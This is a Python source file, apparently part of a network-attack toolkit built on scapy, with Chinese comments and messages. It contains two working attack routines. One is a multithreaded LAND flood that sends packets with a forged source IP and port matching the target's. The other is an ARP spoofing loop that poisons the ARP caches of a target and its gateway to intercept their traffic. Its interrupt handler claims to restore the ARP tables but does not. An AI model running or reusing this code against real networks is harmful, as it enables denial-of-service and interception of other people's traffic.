import concurrent

from scapy.all import *
import random
import sys
import time
import ipaddress
from concurrent.futures import ThreadPoolExecutor

from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import ARP, Ether

from scan_port import print_lock


def send_packet(target_ip, target_port):
    packet = IP(dst=target_ip, src=target_ip) / TCP(dport=target_port, sport=target_port)
    print("发送数据包...")
    send(packet, verbose=0)


def LAND_flood_task(target_ip, target_port, duration, max_workers):
    start_time = time.time()
    end_time = start_time + duration
    total_packets_sent = 0
    print("开始发送LAND洪水攻击...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        while time.time() < end_time:
            futures = []
            for _ in range(max_workers):
                future = executor.submit(send_packet, target_ip, target_port)
                futures.append(future)
            for future in concurrent.futures.as_completed(futures):
                total_packets_sent += 1

    print(f"LAND洪水攻击结束，目标IP: {target_ip}, 目标端口: {target_port}, 总共发送了: {total_packets_sent} 个数据包")




def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    print("目标mac:", target_mac)
    gateway_mac = get_mac(gateway_ip)
    print("网关mac:", gateway_mac)
    # 创建伪造的ARP数据包
    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    try:
        while True:
            # 发送伪造的ARP数据包
            send(target_packet, verbose=False)
            send(gateway_packet, verbose=False)
            print(f"欺骗目标 {target_ip} 和网关 {gateway_ip}")
    except KeyboardInterrupt:
        print("\nARP欺骗停止。恢复ARP表...")

















